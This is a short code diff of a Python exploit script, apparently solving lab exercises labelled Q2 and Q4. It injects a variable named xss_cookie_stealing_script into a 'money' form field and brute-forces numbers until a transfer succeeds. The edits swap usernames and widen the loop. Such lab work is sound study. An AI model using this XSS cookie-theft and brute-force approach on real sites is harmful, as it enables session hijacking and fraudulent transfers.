@@ -20,7 +20,7 @@ xss_cookie_stealing_script = "<script>cookies = document.cookie.split(); console
 
 @app.route('/Q2', methods=['GET', 'POST'])
 def doneLoginPage():
-    return render_template("q2.html", reciever="Gustaf0")
+    return render_template("q2.html", reciever="test2")
 
 
 
@@ -46,15 +46,15 @@ def Q4():
     magicNumber = None
 
     #Look for string, "Can not transfer (money amount and script)"
-    for j in range(10):
+    for j in range(1000):
         form = {
-            "username": "Gustaf0",
+            "username": "test",
             "money": f"{j}{xss_cookie_stealing_script}"
         }
 
         response = webSession.post(url, form)
         if ("Money has been transfered!" in response.text):
-            print(j)
+            print(f"Magic Number is {j}")
             magicNumber = j
             break
 
